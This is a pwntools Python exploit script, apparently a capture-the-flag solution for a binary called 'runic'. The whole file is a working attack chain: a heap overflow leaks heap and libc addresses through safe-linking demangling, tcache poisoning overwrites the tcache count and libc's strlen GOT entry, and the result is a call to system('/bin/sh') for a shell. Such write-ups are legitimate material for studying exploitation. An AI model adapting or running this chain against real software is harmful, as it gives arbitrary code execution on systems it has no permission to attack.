from pwn import *

# Set up pwntools for the correct architecture
exe = "./runic"
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True
libc = ELF("libc.so.6")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    set max-visualize-chunk-size 0x500
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def alloc(len, name, cont):
    ru(b"Action: \n")
    sl(b"1")
    ru(b"name: \n")
    s(name.ljust(8, b"\x00"))
    sl(str(len).encode())
    ru(b"contents: \n")
    sl(cont)


def delete(name):
    ru(b"Action: ")
    sl(b"2")
    ru(b"name: ")
    sl(name.ljust(8, b"\x00"))

def show(name):
    sl(b"4")
    ru(b"name: ")
    sl(name.ljust(8, b"\x00"))
    ru(b"contents:\n\n")
    return rl()

def edit(name, newname, cont):
    sl(b"3")
    ru(b"name: ")
    s(name.ljust(8, b"\x00"))
    s(newname.ljust(8, b"\x00"))
    sl(cont)
    ru(b"")
    return re(500)

def demangle(obfus_ptr):
 o2 = (obfus_ptr >> 12) ^ obfus_ptr
 return (o2 >> 24) ^ o2

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val
    
r = start()
# r = remote("", )

alloc(0x60, b"\x01", b"AAAA")
alloc(0x60, b"\x02", b"BBBB")
alloc(0x20, b"\x03", b"CCCC")
alloc(0x60, b"\x04", b"DDDD")

delete(b"\x01")
delete(b"\x04")
edit(b"\x03", b"\x02\x00\x03", b"A"*(0x20) + b"BBBBBBB")

show(b"\x02\x00\x03")
mangled_leak = u64(rl().strip().ljust(8, b"\x00"))
heap_leak = demangle(mangled_leak) - 672

log.info(f"{hex(heap_leak)}")

# If chunk isn't inserted into the fast bin or tcache, it will first be inserted into the Unsorted Bin.

#correct the size field and overwrite the tcache forward pointer to the tcache_per_thread_struct.count
edit(b"\x05", b"\x02\x00\x04", b"A"*(0x20) + p64(0x71) + p64(mangle(heap_leak+944, heap_leak+0x10)))

alloc(0x60, b"\x01", b"dummy")
alloc(0x60, b"\x04", b"\x00"*8 + b"\x07\x00") # make the count to 7

alloc(0x20, b"\x07", b"hello")
alloc(0x20, b"\x09", b"top_chunk_consolidation") # no top_chunk_consolidation
edit(b"\x06", b"\x02\x00\x06", b"A"*(0x20) + p64(0xa1) + p64(mangle(heap_leak+944, 0)))

# freeing the 0xa0 chunk as the count is 7 -> it is put into unsortedbin.
delete(b"\x01")

#recv the libc leak
edit(b"\x08", b"\x02\x00\x08", b"A"*(0x20) + b"B"*7)
show(b"\x02\x00\x08")
libc.address = u64(rl().strip().ljust(8, b"\x00")) - 2043072

log.info(f"{hex(libc.address)}")

# we can try to overwrite the GOT entry of strlen in libc, so that when it called puts("/bin/sh"), it will trigger system("/bin/sh"), because puts will call strlen to the input string.

# correct the chunk again
edit(b"\x0a", b"\x02\x00\x09", b"A"*(0x20) + p64(0xa1) + p64(libc.address + 2043072) + p64(libc.address + 2043072))

alloc(0x20, b"\x0c", b"LLLL")
alloc(0x20, b"\x11", b"MMMM")
delete(b"\x11")
delete(b"\x0c")
edit(b"\x0b", b"\x02\x00\x0b", b"A"*(0x20) + p64(0x31) + p64(mangle(heap_leak+944, libc.address+0x1f2098-0x18)))

alloc(0x20, b"LAMA\n", b"/bin/sh\x00")
# overwrite the strlen in the libc GOT.
pause()
alloc(0x20, b"\x10", p64(libc.address+0x2c0f0) + p64(libc.address+0x17a780) + p64(libc.symbols['system']))

# Calling system with /bin/sh
sl(b"4")
sl(b"LAMA\n")

r.interactive()